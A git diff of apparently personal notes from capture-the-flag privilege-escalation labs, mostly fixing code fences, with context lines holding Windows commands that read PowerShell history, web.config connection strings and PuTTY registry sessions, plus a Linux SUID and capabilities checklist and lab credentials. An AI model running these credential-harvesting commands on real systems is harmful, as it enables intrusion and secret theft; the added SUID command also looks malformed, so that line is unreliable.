@@ -1188,12 +1188,10 @@ Windows Non User Account
 me=10.10.135.71
 target=10.10.154.247
 
-
-
-``
+```
 root@ip-10-10-135-71:~/repo# xfreerdp /u:thm-unpriv /p:Password321 /cert:ignore /v:10.10.154.247
 connected to 10.10.154.247:3389
-``
+```
 
 Powershell History
 > cmd : type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
@@ -1250,7 +1248,7 @@ IIS Configuration
 Look at these ` type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString `
 
 
-``
+```
 PS C:\Windows\system32\sysprep> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
@@ -1258,11 +1256,10 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 <connectionStrings>
 <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
 </connectionStrings>
-
-``
+```
 
 **RETRIEVE CREDENTIALS FROM Software: Putty**
-``
+```
 
 PS C:\Windows\system32\sysprep> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
@@ -1283,22 +1280,6 @@ End of search: 10 match(es) found.
 
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ---
 
 ## SUMMARY 
@@ -1309,15 +1290,12 @@ Linux Privilege Escalation:
 - Sudo 
 > sudo -l, gtfobins.github.io
 - SUID 
-> 
-
+> find / type f -perm -0400 -ls 2>/dev/null 
 - CAPABILITIES 
 > getcap -r 2>/dev/null 
  
 
 ### PLAYBOOK 1
-
-
 
 ```bash
 mkdir -p /tmp/hvck
@@ -1343,7 +1321,4 @@ echo "[+] Check here: https://gtfobins.github.io/"
 # Check Capabilities 
 echo "[+] Checking for Root Capabilities"
 getcap -r / 2>/dev/null 
-
-
-
 ```
